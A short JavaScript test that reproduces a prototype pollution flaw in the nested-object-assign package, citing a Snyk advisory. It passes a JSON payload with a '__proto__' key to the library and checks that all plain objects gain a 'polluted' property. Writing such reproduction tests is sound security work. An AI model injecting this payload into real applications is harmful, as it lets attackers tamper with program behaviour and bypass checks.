//https://snyk.io/vuln/SNYK-JS-NESTEDOBJECTASSIGN-1065977

test("prototype pollution in nested-object-assign", () => {
    
    const assign = require('nested-object-assign');
    expect({}.polluted).toBe(undefined);
    assign({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'))

    expect({}.polluted).toBe("yes");
  });
  